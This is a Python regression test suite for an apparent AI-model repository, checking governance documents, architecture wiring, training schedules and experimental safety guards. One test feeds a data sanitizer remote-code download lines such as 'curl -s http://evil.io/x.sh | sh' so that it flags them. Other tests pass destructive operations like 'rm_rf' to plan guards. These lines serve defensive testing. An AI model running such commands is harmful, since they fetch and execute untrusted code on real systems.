#!/usr/bin/env python3
"""
Sovereign AI Brain (Route B v2.2) — Permanent Automated Regression & Invariant Test Suite (GAP-22)
==================================================================================================
Runs cleanly in <1s on ANY environment (pure Python + NumPy + AST, zero GPU required), and
automatically runs full PyTorch forward/backward/Q4 round-trip tests whenever `torch` is installed.
"""
from __future__ import annotations

import ast
import importlib.util
import math
import py_compile
import re
import sys
import tempfile
import unittest
from pathlib import Path

import numpy as np

REPO_ROOT = Path(__file__).resolve().parent.parent
BRAIN_DIR = REPO_ROOT / "src" / "brain"
if str(BRAIN_DIR) not in sys.path:
    sys.path.insert(0, str(BRAIN_DIR))

import exoskeleton_bridge as eb
import prepare_seed_corpus as psc
import wake_sleep_runtime as wsr
sys.path.insert(0, str(REPO_ROOT / "src" / "experimental"))
import harness_and_safety_policies as exp_hsp
import memory_and_sleep_planners as exp_msp


class Test03GovernanceAndSSOT(unittest.TestCase):
    """Verifies syntax, AST causal wiring, mathematical invariants, and repo consistency."""

    def test_10_whitepaper_and_registry_zero_duplicate_902(self) -> None:
        wp = (REPO_ROOT / "docs" / "whitepapers" / "sovereign_ai_brain_whitepaper.md").read_text(encoding="utf-8")
        reg = (REPO_ROOT / "docs" / "whitepapers" / "brain_paper_organ_registry.md").read_text(encoding="utf-8")
        m_ref = None
        for m in re.finditer(r"(?m)^##\s+.*参考文献.*$", wp):
            m_ref = m
        self.assertIsNotNone(m_ref)
        entries = re.findall(r"(?m)^\s*(\d+)\.\s+(.+)$", wp[m_ref.start():])
        self.assertEqual(len(entries), 2236)
        self.assertEqual([int(n) for n, _ in entries], list(range(1, 2237)))
        seen = {}
        for idx, (_, txt) in enumerate(entries, 1):
            for aid in set(re.findall(r"arXiv:(\d{4}\.\d{4,5})", txt)):
                seen.setdefault(aid, []).append(idx)
        dups = {k: v for k, v in seen.items() if len(v) > 1}
        self.assertEqual(dups, {}, f"Duplicate arXiv IDs found: {dups}")
        reg_nums = sorted(int(x) for x in re.findall(r"(?m)^\|\s*`\[(\d+)\]`\s*\|", reg))
        self.assertEqual(reg_nums, list(range(1, 2237)))

    def test_47_gap60_curriculum_aware_wsd_and_data_constrained_wd(self) -> None:
        import ast, pathlib
        tsrc = (REPO_ROOT / "src" / "brain" / "training_engine.py").read_text(encoding="utf-8")
        self.assertIn("data_constrained_weight_decay: float = 0.05", tsrc)
        self.assertIn("curriculum_plateau_lr_ratio: float = 0.35", tsrc)
        tree = ast.parse(tsrc)
        fn_node = [n for n in tree.body if isinstance(n, ast.FunctionDef) and n.name == "wsd_lr_schedule"][0]
        class _Cfg:
            warmup_steps = 100
            total_steps = 1000
            decay_steps = 200
            base_lr = 0.02
            min_lr = 0.002
            curriculum_plateau_lr_ratio = 0.35
        ns = {"math": math, "TrainConfig": _Cfg}
        exec(compile(ast.Module(body=[fn_node], type_ignores=[]), "<wsd>", "exec"), ns)
        fn = ns["wsd_lr_schedule"]
        # At midpoint of decay (step=900, progress=0.5), LR must still be >= 0.35 * base_lr = 0.007
        lr_mid = fn(900, _Cfg())
        lr_end = fn(1000, _Cfg())
        self.assertGreaterEqual(lr_mid, 0.007 - 1e-6)
        self.assertAlmostEqual(lr_end, 0.002, places=6)


    def test_65_gap79_half_success_grpo_curriculum_and_primacy_guard(self) -> None:
        import ast, pathlib
        from typing import Sequence
        tsrc = (REPO_ROOT / "src" / "brain" / "training_engine.py").read_text(encoding="utf-8")
        self.assertIn("def select_half_success_curriculum_prompts(", tsrc)
        tree = ast.parse(tsrc)
        fn_node = [n for n in tree.body if isinstance(n, ast.FunctionDef) and n.name == "select_half_success_curriculum_prompts"][0]
        ns = {"Sequence": Sequence, "List": list}
        exec(compile(ast.Module(body=[fn_node], type_ignores=[]), "<curr>", "exec"), ns)
        fn = ns["select_half_success_curriculum_prompts"]
        # Rates: 0=easy(0.95), 1=mid(0.50), 2=mid(0.48), 3=hard(0.05), 4=easy(0.99)
        picked = fn([0.95, 0.50, 0.48, 0.05, 0.99], top_k=3, hard_floor_frac=0.33)
        self.assertIn(3, picked)  # Hard prompt preserved against primacy bias
        self.assertIn(1, picked)  # p=0.50 maximum Bernoulli variance
        self.assertIn(2, picked)  # p=0.48 second highest variance

    def test_74_standing_constraints_and_stop_reading_governance(self) -> None:
        wp = (REPO_ROOT / "docs" / "whitepapers" / "sovereign_ai_brain_whitepaper.md").read_text(encoding="utf-8")
        reg = (REPO_ROOT / "docs" / "whitepapers" / "brain_paper_organ_registry.md").read_text(encoding="utf-8")
        for token in (
            "C1. 消费级 4GB 硬件底线与集群缩放",
            "C3. 多层硬核信源矩阵（绝不只搜顶会）",
            "SOSP / OSDI / ISCA / ASPLOS / PLDI / POPL",
            "C5. 全火力 8+ 路正交宽搜与无死上限真突破准入",
            "C7. 逆序阅读与「失败墓园」优先原则",
            "C8. 停止阅读三大熔断阈值（防倒 U 陷阱）",
            "边际惊奇度归零",
            "C10. 纯文本 Mermaid 与单一 `.zip` 交付",
        ):
            self.assertIn(token, wp, f"Missing solidified constraint in whitepaper: {token}")
        self.assertIn("8+ 路正交宽搜 × 无死上限真突破准入", reg)
        self.assertIn("停止阅读三大熔断阈值", reg)
        sc = (REPO_ROOT / "SYSTEM_CONSTITUTION.md").read_text(encoding="utf-8")
        for tok in ("14. **跨架构无偏见取核铁律**", "15. **多层硬核信源矩阵与时空 DAG 溯源铁律", "16. **四层幂律漏斗与问题锚定 Pull 检索铁律", "17. **逆序批判精读与「失败墓园」资产优先铁律**", "18. **停止阅读三大熔断阈值铁律", "19. **活体主干实接、架构图同步演进与更优标准即时固化铁律**", "## 七、单轮研究与架构演进完整标准执行闭环（8-Step Per-Round SOP）", "三层零冲突系统融合审计", "纯文本 Git 可 Diff 的 Mermaid"):
            self.assertIn(tok, sc, f"Missing meta-constraint in SYSTEM_CONSTITUTION.md: {tok}")


    def test_91_live_architecture_wiring_and_mermaid_v43_sync(self) -> None:
        bsrc = (REPO_ROOT / "src" / "brain" / "sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        self.assertIn("best_h = loopcd_contrastive_decode(best_h, h_early_cd", bsrc)
        self.assertIn("compute_biloco_binary_lowrank_correction(res_2d, rank=int(biloco_rank))", bsrc)
        diag = (REPO_ROOT / "docs" / "architecture" / "ARCHITECTURE_DIAGRAMS.md").read_text(encoding="utf-8")
        for tok in ("GAP-82 过思考早停护栏", "GAP-92 LoopCD-Hidden", "GAP-95 BiLoCo", "GAP-98 Sentry", "GAP-100/108/118 三模态+RRR+WMT分层保留记忆", "GAP-111 MeqMuon", "GAP-112 ActKV", "GAP-113 DQ", "GAP-119 PPMF", "GAP-124 2D转置不变分块", "GAP-127 DeepSeek-V4 CSA/HCA", "GAP-128 Kimi-K2 MuonClip", "GAP-132 FlatCake一次性写平铺KV", "GAP-133 LEASH三级安全门控", "GAP-134 ToolRoute工具健康遥测", "GAP-135 安全主控多脑治理", "GAP-137 OwlSight全景CoT脱敏监控", "GAP-141 Codex分层沙箱解析前DNS门控", "GAP-142 性能工厂对抗反事实闭环", "GAP-143 NVIDIA Dynamo/Reshard热更与KV路由", "GAP-144 Anthropic脑手解耦与金库代理", "GAP-145 OpenAI前向域分层Linter", "GAP-146 ML Drift阶段内核与Gemma4 PLE", "GAP-147 NVFP4 16元素微块随机舍入", "GAP-148 TPU256对齐GDN与LatentMoE", "GAP-150 Anthropic两阶段推理盲分类器", "GAP-151 NVIDIA PAIR局域网路由与OpenShell", "GAP-152 Google全会话旁路异常检测", "GAP-153 SGLang三路径NVFP4-KV", "GAP-154 FA4方阵量化与零填充Jagged", "GAP-156 BCG可打断CUDA图", "GAP-157 MERLIN二阶矩路由", "GAP-159 ResidualQuant 2-bit循环KV(-80.7%)", "GAP-160 E8-QAT隐式格2-bit", "GAP-165 INT8精确4.26-bit块GEMM(RTX3050原生)", "GAP-166 PACT并行认证提交", "GAP-169 BridgeKV跨模型KV缝合"):
            self.assertIn(tok, diag, f"Missing v4.3 topology node in ARCHITECTURE_DIAGRAMS.md: {tok}")


    def test_126_constitution_rule20_nonpaper_l2_freshness_solidified(self) -> None:
        const = (REPO_ROOT / "SYSTEM_CONSTITUTION.md").read_text(encoding="utf-8")
        self.assertIn("第 20 条（全球“绝不可丢”双轨全量清扫", const)
        self.assertIn("全球双轨并重 + 成果密度梯队 + 新替旧淘汰原则", const)

    def test_159_cto_zero_dead_classes_in_core_brain_and_adr(self) -> None:
        const = (REPO_ROOT / "SYSTEM_CONSTITUTION.md").read_text(encoding="utf-8")
        adr = (REPO_ROOT / "docs" / "architecture" / "ARCHITECTURE_DECISIONS.md").read_text(encoding="utf-8")
        self.assertIn("第 21 条", const)
        self.assertIn("ADR-001", adr)
        self.assertIn("ADR-010", adr)
        self.assertIn("ADR-012", adr)

        # Hard AST Gate across ALL FOUR core src/brain/ files: ZERO uncalled standalone classes!
        core_specs = [
            ("sovereign_brain_pytorch.py", {"SovereignRouteBBrain", "RouteBConfig", "RouteBCache", "PolarExpressMuonOptimizer"}),
            ("training_engine.py", {"TrainConfig", "AdaptiveDepthPriorController", "StreamingByteCorpus"}),
            ("wake_sleep_runtime.py", {"WakeTurnResult", "WakeSleepRuntimeState", "WakeSleepBrainRuntime"}),
            ("exoskeleton_bridge.py", {
                "ByteStreamControlProtocol", "UncertaintyReadout", "AsymmetricWritePort",
                "UniversalByteCodec", "DecomposedUncertainty", "SplitConformalAbstentionCalibrator",
                "VersionedWeightSnapshot", "ConditionalFailurePlaybook",
            }),
        ]
        for fname, roots in core_specs:
            src = (REPO_ROOT / "src" / "brain" / fname).read_text(encoding="utf-8")
            tree = ast.parse(src)
            class_nodes = {n.name: n for n in tree.body if isinstance(n, ast.ClassDef)}
            refs = {}
            for n in tree.body:
                names = set()
                for sub in ast.walk(n):
                    if isinstance(sub, ast.Name):
                        names.add(sub.id)
                    elif isinstance(sub, ast.Attribute):
                        names.add(sub.attr)
                refs[id(n)] = names
            live = set(roots)
            for n in tree.body:
                if not isinstance(n, ast.ClassDef):
                    for cn in class_nodes:
                        if cn in refs[id(n)]:
                            live.add(cn)
            changed = True
            while changed:
                changed = False
                for cn in list(live):
                    if cn in class_nodes:
                        for other in class_nodes:
                            if other != cn and other not in live and other in refs[id(class_nodes[cn])]:
                                live.add(other)
                                changed = True
            dead = sorted(set(class_nodes.keys()) - live)
            self.assertEqual(dead, [], f"Uncalled standalone classes polluted src/brain/{fname}: {dead}")
        # Hard AST Gate for sovereign_brain_pytorch.py: ZERO uncalled standalone top-level functions!
        bsrc = (REPO_ROOT / "src" / "brain" / "sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        btree = ast.parse(bsrc)
        bfuncs = {n.name: n for n in btree.body if isinstance(n, ast.FunctionDef)}
        brefs = {}
        for n in btree.body:
            ns = set()
            for sub in ast.walk(n):
                if isinstance(sub, ast.Name):
                    ns.add(sub.id)
                elif isinstance(sub, ast.Attribute):
                    ns.add(sub.attr)
            brefs[id(n)] = ns
        lf = {"main"}
        for n in btree.body:
            if isinstance(n, ast.ClassDef) or (isinstance(n, ast.FunctionDef) and n.name == "main"):
                for fn in bfuncs:
                    if fn in brefs[id(n)]:
                        lf.add(fn)
        ch = True
        while ch:
            ch = False
            for fn in list(lf):
                if fn in bfuncs:
                    for other in bfuncs:
                        if other != fn and other not in lf and other in brefs[id(bfuncs[fn])]:
                            lf.add(other)
                            ch = True
        dead_funcs = sorted(set(bfuncs.keys()) - lf)
        self.assertEqual(dead_funcs, [], f"Uncalled standalone functions polluted sovereign_brain_pytorch.py: {dead_funcs}")

    def test_175_cto_adr_covers_all_core_supersessions(self) -> None:
        adr = (REPO_ROOT / "docs" / "architecture" / "ARCHITECTURE_DECISIONS.md").read_text(encoding="utf-8")
        for token in (
            "ADR-001", "ADR-012", "✅ 既定主干", "⚔️ 同位待 PK", "❌ 淘汰",
            "Phase 1", "Phase 2", "Phase 3", "Scale-Up",
            "GateSight", "BitNest", "StrataFlux", "PyTorch Helion", "Deletion Tuning", "KAPPO", "DIA", "OPSD",
        ):
            self.assertIn(token, adr)

    def test_182_cto_unified_three_verdict_six_substate_closure(self) -> None:
        reg = (REPO_ROOT / "docs" / "whitepapers" / "brain_paper_organ_registry.md").read_text(encoding="utf-8")
        self.assertIn("## 零、全仓唯一统一裁决矩阵", reg)
        non_fixed_tags = {"⚔️同位待PK", "⚡扩展储备", "⛔负向禁令", "📜历史淘汰"}
        rows = re.findall(r"(?m)^\|\s*`\[(\d+)\]`\s*\|\s*`\[([^]]+)\]`\s*\|", reg)
        self.assertEqual(len(rows), 2236)
        for _, tag in rows:
            ok = (tag in non_fixed_tags) or bool(re.match(r"^✅既定·(?:活体已接电|待阶段接电)·[^·]+$", tag))
            self.assertTrue(ok, f"Unexpected legacy/unfused tag in unified taxonomy: {tag}")

    def test_184_cto_benchmark_summary_index_complete(self) -> None:
        import json
        rep_dir = REPO_ROOT / "benchmarks" / "reports"
        summary_p = rep_dir / "BENCHMARK_SUMMARY.json"
        self.assertTrue(summary_p.exists())
        data = json.loads(summary_p.read_text(encoding="utf-8"))
        raw_files = sorted(p.name for p in rep_dir.glob("*.json") if p.name != "BENCHMARK_SUMMARY.json")
        self.assertEqual(data["total_raw_reports"], len(raw_files))
        self.assertEqual(sorted(r["file"] for r in data["reports"]), raw_files)


    def test_185_cto_v8_packaging_and_config_profiles(self) -> None:
        self.assertTrue((REPO_ROOT / "pyproject.toml").exists())
        self.assertTrue((REPO_ROOT / "src" / "harness" / "__init__.py").exists())
        self.assertFalse((REPO_ROOT / "docs" / "architecture" / "RUNBOOK_AND_PROMOTION_PROTOCOL.md").exists())
        import importlib.util
        spec = importlib.util.spec_from_file_location("cfg_prof", str(REPO_ROOT / "src" / "brain" / "config_profiles.py"))
        mod = importlib.util.module_from_spec(spec)
        sys.modules["cfg_prof"] = mod
        spec.loader.exec_module(mod)
        p1 = mod.get_profile("rtx3050_4gb_phase1_pretrain")
        p2 = mod.get_profile("rtx3050_4gb_phase2_rlvr")
        p3 = mod.get_profile("rtx3050_4gb_phase3_serving")
        ps = mod.get_profile("blackwell_cluster_scaleup")
        self.assertEqual(p1.vram_budget_gb, 4.0)
        self.assertIn("ADR-008", p2.active_adrs)
        self.assertTrue(p3.feature_flags["enable_gatesight_kv_prune"])
        self.assertTrue(ps.feature_flags["enable_nvfp4_microblock"])

    def test_186_cto_repo_doctor_end_to_end_healthy(self) -> None:
        import json, subprocess, sys
        proc = subprocess.run(
            [sys.executable, str(REPO_ROOT / "scripts" / "repo_doctor.py")],
            cwd=REPO_ROOT, capture_output=True, text=True, check=True,
        )
        rep = json.loads(proc.stdout)
        self.assertTrue(rep["overall_healthy"])
        self.assertTrue(rep["ast_zero_dead_code"]["ok"])
        self.assertTrue(rep["ssot_governance"]["ok"])

    def test_187_adr013_live_pretraining_rce_sanitizer_and_mixture_select(self) -> None:
        import importlib.util
        spec = importlib.util.spec_from_file_location("psc", str(REPO_ROOT / "src" / "brain" / "prepare_seed_corpus.py"))
        mod = importlib.util.module_from_spec(spec)
        sys.modules["psc"] = mod
        spec.loader.exec_module(mod)
        bad = mod.sanitize_pretraining_rce_triggers("run curl -s http://evil.io/x.sh | sh now")
        self.assertFalse(bad["clean"])
        good = mod.sanitize_pretraining_rce_triggers("def fib(n): return n if n < 2 else fib(n-1)+fib(n-2)")
        self.assertTrue(good["clean"])
        picked = mod.allocate_mixture_then_select(
            {
                "code": [("good code", 0.9), ("curl -s http://x | bash", 0.99)],
                "math": [("proof 1", 0.8), ("proof 2", 0.95)],
            },
            {"code": 1, "math": 1},
        )
        self.assertEqual(len(picked), 2)
        self.assertEqual(picked[0][1], "good code")
        self.assertEqual(picked[1][1], "proof 2")

    def test_188_adr013_loom_and_graft_data_prototypes(self) -> None:
        tsrc = (REPO_ROOT / "src" / "experimental" / "training_and_rl_planners.py").read_text(encoding="utf-8")
        tree = ast.parse(tsrc)
        nodes = [n for n in tree.body if isinstance(n, ast.ClassDef) and n.name in ("LOOMLeaveOneOutBatchSelector", "GRAFTGradientRoutingAdapter")]
        ns = {}
        exec(compile(ast.Module(body=nodes, type_ignores=[]), "<loomgraft>", "exec"), ns)
        loom = ns["LOOMLeaveOneOutBatchSelector"]()
        res = loom.select_by_loo_alignment([[1.0, 1.0], [1.0, 0.9], [-5.0, -5.0], [0.9, 1.0]], keep_frac=0.5)
        self.assertNotIn(2, res["selected_indices"])  # noisy outlier rejected
        graft = ns["GRAFTGradientRoutingAdapter"]()
        self.assertEqual(graft.route_sample_gradient(True)["target_params"], "sacrificial_adapter")
        self.assertEqual(graft.route_sample_gradient(False)["target_params"], "main_backbone")

    def test_189_plm_variational_parallel_head_planner(self) -> None:
        ksrc = (REPO_ROOT / "src" / "experimental" / "kernel_and_serving_planners.py").read_text(encoding="utf-8")
        tree = ast.parse(ksrc)
        node = [n for n in tree.body if isinstance(n, ast.ClassDef) and n.name == "PLMVariationalParallelHeadPlanner"][0]
        ns = {}
        exec(compile(ast.Module(body=[node], type_ignores=[]), "<plm>", "exec"), ns)
        p = ns["PLMVariationalParallelHeadPlanner"]()
        self.assertAlmostEqual(p.compute_variational_loss_mix(2.0, 1.5, 0.5, beta=0.2), 3.6, places=5)

    def test_190_bos_summary_live_wiring_and_master_traceability(self) -> None:
        bsrc = (REPO_ROOT / "src" / "brain" / "sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        self.assertIn("enable_bos_summary_prefill: bool = False", bsrc)
        self.assertIn("bos_mask[0, :] = True", bsrc)
        mti = (REPO_ROOT / "docs" / "architecture" / "ARCHITECTURE_DECISIONS.md").read_text(encoding="utf-8")
        for i in range(1, 14):
            self.assertIn(f"ADR-{i:03d}", mti)

    def test_191_calibrated_decision_reward_judge_and_sft_first_redline(self) -> None:
        tsrc = (REPO_ROOT / "src" / "experimental" / "training_and_rl_planners.py").read_text(encoding="utf-8")
        tree = ast.parse(tsrc)
        node = [n for n in tree.body if isinstance(n, ast.ClassDef) and n.name == "CalibratedDecisionRewardJudge"][0]
        ns = {}
        exec(compile(ast.Module(body=[node], type_ignores=[]), "<caljudge>", "exec"), ns)
        j = ns["CalibratedDecisionRewardJudge"]()
        self.assertTrue(j.score_and_gate(0.8, 0.20, has_gold_sft=True)["avoid_cold_start_grpo"])
        self.assertEqual(j.score_and_gate(0.85, 0.60, has_gold_sft=False)["mode"], "calibrated_reference_free_grpo")

    def test_192_sga_sparse_live_and_8_md_lock(self) -> None:
        md_files = [p for p in REPO_ROOT.rglob("*.md") if ".git" not in p.parts]
        self.assertEqual(len(md_files), 8, f"Expected exactly 8 .md files, got {[p.name for p in md_files]}")
        bsrc = (REPO_ROOT / "src" / "brain" / "sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        self.assertIn("ffn_sparsity_thresh: float = 0.0", bsrc)
        self.assertIn("gate_act.abs() >= self.ffn_sparsity_thresh", bsrc)
        wp = (REPO_ROOT / "docs" / "whitepapers" / "sovereign_ai_brain_whitepaper.md").read_text(encoding="utf-8")
        self.assertIn("### 0.0D 活体架构正文演进同步", wp)

    def test_193_closed_practical_kernel_and_fastweight_code(self) -> None:
        ksrc = (REPO_ROOT / "src" / "experimental" / "kernel_and_serving_planners.py").read_text(encoding="utf-8")
        tree = ast.parse(ksrc)
        wanted = {"GSA2TwoSidedAssociativeMemory", "StrataFluxHierarchyPrecisionStreamer", "HyperThinkVQWeightGenerator", "BitLLMIntegerNativeDecoder", "TopoQuantDriftMonitor"}
        nodes = [n for n in tree.body if isinstance(n, ast.ClassDef) and n.name in wanted]
        self.assertEqual(len(nodes), 5)
        ns = {}
        exec(compile(ast.Module(body=nodes, type_ignores=[]), "<v90k>", "exec"), ns)
        self.assertEqual(ns["GSA2TwoSidedAssociativeMemory"]().step_update([0.0], [0.0], [1.0], [1.0])["k_slot"], [0.2])
        self.assertTrue(ns["StrataFluxHierarchyPrecisionStreamer"]().plan_tier_streaming(6.0, 4.0)["stream_refinement_from_ram"])
        self.assertEqual(ns["HyperThinkVQWeightGenerator"]().select_vq_update_code([1.0, 0.0], [[0.0, 1.0], [1.0, 0.0]]), 1)
        self.assertTrue(ns["BitLLMIntegerNativeDecoder"]().audit_pipeline_fusion(False)["integer_native_hot_path"])
        self.assertFalse(ns["TopoQuantDriftMonitor"]().check_safe_compression(0.40)["safe_to_quantize_further"])

    def test_194_closed_group_synthetic_and_dialoggrpo(self) -> None:
        tsrc = (REPO_ROOT / "src" / "experimental" / "training_and_rl_planners.py").read_text(encoding="utf-8")
        tree = ast.parse(tsrc)
        nodes = [n for n in tree.body if isinstance(n, ast.ClassDef) and n.name in ("GroupLevelSyntheticCurator", "DialogGRPOElicitationDAG")]
        ns = {}
        exec(compile(ast.Module(body=nodes, type_ignores=[]), "<v90t>", "exec"), ns)
        self.assertFalse(ns["GroupLevelSyntheticCurator"]().admit_synthetic_group(0.9, 0.2)["admitted"])
        self.assertTrue(ns["DialogGRPOElicitationDAG"]().should_ask_clarification(0.8, 0.7))

    def test_195_soteria_tenonagent_casebench_exoskeleton_security(self) -> None:
        hsrc = (REPO_ROOT / "src" / "experimental" / "harness_and_safety_policies.py").read_text(encoding="utf-8")
        tree = ast.parse(hsrc)
        nodes = [n for n in tree.body if isinstance(n, ast.ClassDef) and n.name in ("SoteriaVerifiedPlanEnforcer", "TenonAgentResidencyController", "CASEBenchSecurityContextGuard")]
        ns = {}
        exec(compile(ast.Module(body=nodes, type_ignores=[]), "<v90h>", "exec"), ns)
        self.assertFalse(ns["SoteriaVerifiedPlanEnforcer"]().verify_plan([{"op": "rm_rf"}], {"rm_rf"})["plan_verified"])
        self.assertFalse(ns["TenonAgentResidencyController"]().admit_sandbox(3500.0, 1000.0, 4000.0)["admit"])
        self.assertFalse(ns["CASEBenchSecurityContextGuard"]().audit_context_window(True, 1)["secure_context"])

    def test_196_architecture_diagrams_v91_sync_and_rule22_pipeline(self) -> None:
        diag = (REPO_ROOT / "docs" / "architecture" / "ARCHITECTURE_DIAGRAMS.md").read_text(encoding="utf-8")
        for tok in (
            "Route B v10.32",
            "GateSightKVPruner",
            "BOS Summary",
            "SGA-Sparse",
            "BitNest",
            "Mixture-then-Select",
            "Soteria",
            "TenonAgent",
            "EpiLoRA",
            "Fairway",
            "PrefixCacheMetastabilityBudgeter",
            "QHijackCrossPrecisionAuditGate",
            "ShapleyCompactMemoryPruner",
        ):
            self.assertIn(tok, diag)
        const = (REPO_ROOT / "SYSTEM_CONSTITUTION.md").read_text(encoding="utf-8")
        self.assertIn("第 22 条（单条新突破 6 步强制全链路闭环铁律", const)

    def test_197_v91_epilora_fairway_metastability_cmu_shapley(self) -> None:
        import ast, sys
        from dataclasses import dataclass
        # Dynamically exec only the v9.1 pure-Python dataclasses from kernel_and_serving_planners & memory_and_sleep_planners
        ksp_src = (REPO_ROOT / "src" / "experimental" / "kernel_and_serving_planners.py").read_text(encoding="utf-8")
        ns: dict = {"dataclass": dataclass}
        tree = ast.parse(ksp_src)
        target_names = {
            "EpiLoRAFusedEpiloguePlanner",
            "FairwayDualLanePrefillScheduler",
            "PrefixCacheMetastabilityBudgeter",
            "CmuFluidServicePriorityRouter",
        }
        mod_nodes = [n for n in tree.body if isinstance(n, ast.ClassDef) and n.name in target_names]
        exec(compile(ast.Module(body=mod_nodes, type_ignores=[]), "<v91_ksp>", "exec"), ns)

        epi = ns["EpiLoRAFusedEpiloguePlanner"](base_params_b=27.0)
        mem = epi.estimate_memory_gb()
        self.assertTrue(mem["fits_single_48gb_gpu"])
        self.assertTrue(mem["eliminates_train_infer_mismatch"])
        self.assertLess(mem["epilora_weight_gb"], mem["unfused_weight_gb"])

        fw = ns["FairwayDualLanePrefillScheduler"](fair_lane_wait_threshold_ms=100.0)
        order = fw.schedule([
            {"id": "fast_low", "prefix_hit_ratio": 0.2, "wait_ms": 10.0, "prompt_tokens": 500},
            {"id": "starved", "prefix_hit_ratio": 0.1, "wait_ms": 220.0, "prompt_tokens": 500},
            {"id": "fast_high", "prefix_hit_ratio": 0.9, "wait_ms": 15.0, "prompt_tokens": 500},
        ])
        self.assertEqual(order, ["starved", "fast_high", "fast_low"])

        meta = ns["PrefixCacheMetastabilityBudgeter"](max_resident_kv_ratio=0.80, min_healthy_hit_ratio=0.35)
        res = meta.enforce(
            active_sessions=[
                {"id": "s_old", "kv_ratio": 0.30, "progress": 0.9},
                {"id": "s_new", "kv_ratio": 0.25, "progress": 0.1},
            ],
            resident_kv_ratio=0.95,
            cache_hit_ratio=0.12,
        )
        self.assertEqual(res["action"], "suspend_admitted_sessions")
        self.assertEqual(res["suspended_ids"], ["s_new"])
        self.assertLessEqual(res["projected_kv_ratio"], 0.80)

        cmu = ns["CmuFluidServicePriorityRouter"]()
        ranked = cmu.rank_jobs([
            {"id": "slow_heavy", "holding_cost": 1.0, "compute_ms": 10.0, "bw_ms": 12.0, "kv_pressure": 0.8},
            {"id": "fast_urgent", "holding_cost": 2.0, "compute_ms": 2.0, "bw_ms": 3.0, "kv_pressure": 0.1},
        ])
        self.assertEqual(ranked[0], "fast_urgent")

        msp_src = (REPO_ROOT / "src" / "experimental" / "memory_and_sleep_planners.py").read_text(encoding="utf-8")
        mtree = ast.parse(msp_src)
        mnodes = [n for n in mtree.body if isinstance(n, ast.ClassDef) and n.name == "ShapleyCompactMemoryPruner"]
        mns: dict = {"dataclass": dataclass}
        exec(compile(ast.Module(body=mnodes, type_ignores=[]), "<v91_msp>", "exec"), mns)
        pruner = mns["ShapleyCompactMemoryPruner"](keep_ratio=0.20)
        kept = pruner.prune_indices([0.1, 0.9, 0.2, 0.05, 0.85, 0.01, 0.02, 0.03, 0.04, 0.06])
        self.assertEqual(kept, [1, 4])

    def test_198_qhijack_cross_precision_audit_gate(self) -> None:
        import ast, pathlib
        from dataclasses import dataclass
        hsp_src = (REPO_ROOT / "src" / "experimental" / "harness_and_safety_policies.py").read_text(encoding="utf-8")
        htree = ast.parse(hsp_src)
        hnodes = [n for n in htree.body if isinstance(n, ast.ClassDef) and n.name == "QHijackCrossPrecisionAuditGate"]
        hns: dict = {"dataclass": dataclass}
        exec(compile(ast.Module(body=hnodes, type_ignores=[]), "<v91_hsp>", "exec"), hns)
        gate = hns["QHijackCrossPrecisionAuditGate"]()
        clean = gate.audit_adapter([0, 1, 1, 0], [0, 1, 1, 0], mean_kl=0.02)
        self.assertTrue(clean["approved"])
        hijacked = gate.audit_adapter([0, 1, 1, 0], [1, 0, 1, 0], mean_kl=0.45)
        self.assertFalse(hijacked["approved"])
        self.assertEqual(hijacked["reason"], "block_qhijack_quantization_residual_activation")

    def test_199_gatefloor_groupclip_live_wiring(self) -> None:
        bsrc = (REPO_ROOT / "src" / "brain" / "sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        self.assertIn("silu_gate_floor: float = 0.02", bsrc)
        self.assertIn("gate_act = F.silu(self.w_gate(h)) + self.silu_gate_floor", bsrc)
        tsrc = (REPO_ROOT / "src" / "brain" / "training_engine.py").read_text(encoding="utf-8")
        self.assertIn("def group_clip_grad_norm_(", tsrc)
        self.assertIn("group_clip_grad_norm_(model,", tsrc)

    def test_200_v92_airlock_prism_cisa_taccot_and_graph_ssot(self) -> None:
        import ast, json, subprocess, sys
        from dataclasses import dataclass, field

        hsp_src = (REPO_ROOT / "src" / "experimental" / "harness_and_safety_policies.py").read_text(encoding="utf-8")
        htree = ast.parse(hsp_src)
        hnames = {
            "AirlockProvenanceContainmentGate",
            "PRISMCausalPrivilegeMinimizer",
            "ContinualHarnessRegressionGuard",
            "EvolveAuditedGuardrailRegistry",
        }
        hns: dict = {"dataclass": dataclass, "field": field}
        exec(compile(ast.Module(body=[n for n in htree.body if isinstance(n, ast.ClassDef) and n.name in hnames], type_ignores=[]), "<v92_hsp>", "exec"), hns)

        airlock = hns["AirlockProvenanceContainmentGate"]()
        res = airlock.contain_blast_radius([("a1", "a2"), ("a2", "a3"), ("b1", "b2")], ["a2"])
        self.assertEqual(res["quarantined_nodes"], ["a2", "a3"])
        self.assertEqual(res["preserved_healthy_nodes"], ["a1", "b1", "b2"])

        prism = hns["PRISMCausalPrivilegeMinimizer"](necessity_threshold=0.55)
        pr = prism.minimize_tools({"read_file": 0.92, "delete_db": 0.05, "shell_exec": 0.10, "search": 0.78})
        self.assertEqual(pr["granted_tools"], ["read_file", "search"])
        self.assertEqual(pr["privilege_reduction_ratio"], 0.5)

        guard = hns["ContinualHarnessRegressionGuard"](max_allowed_drop_pp=1.5)
        self.assertFalse(guard.approve_evolution({"swe_bench": 94.0}, {"swe_bench": 32.0})["approved"])
        self.assertTrue(guard.approve_evolution({"swe_bench": 94.0}, {"swe_bench": 93.2})["approved"])

        ev = hns["EvolveAuditedGuardrailRegistry"]()
        self.assertFalse(ev.register_tool("unverified_rule", False))
        self.assertTrue(ev.register_tool("verified_rule", True))

        ksp_src = (REPO_ROOT / "src" / "experimental" / "kernel_and_serving_planners.py").read_text(encoding="utf-8")
        ktree = ast.parse(ksp_src)
        knames = {"CISAChunkIndexedSparseAttentionPlanner", "TACCoTInterleavedLatentToolScheduler"}
        kns: dict = {"dataclass": dataclass}
        exec(compile(ast.Module(body=[n for n in ktree.body if isinstance(n, ast.ClassDef) and n.name in knames], type_ignores=[]), "<v92_ksp>", "exec"), kns)
        cisa = kns["CISAChunkIndexedSparseAttentionPlanner"](chunk_size=128, chunk_budget=512)
        self.assertGreaterEqual(cisa.estimate_kv_read_reduction(1_048_576)["kv_read_reduction_x"], 8.0)
        tac = kns["TACCoTInterleavedLatentToolScheduler"](latent_compression_ratio=6.0)
        self.assertGreater(tac.plan_steps(600, 40)["forward_reduction_x"], 4.0)

        # Verify repo_doctor.py --trace works end-to-end on ARCHITECTURE_GRAPH.json
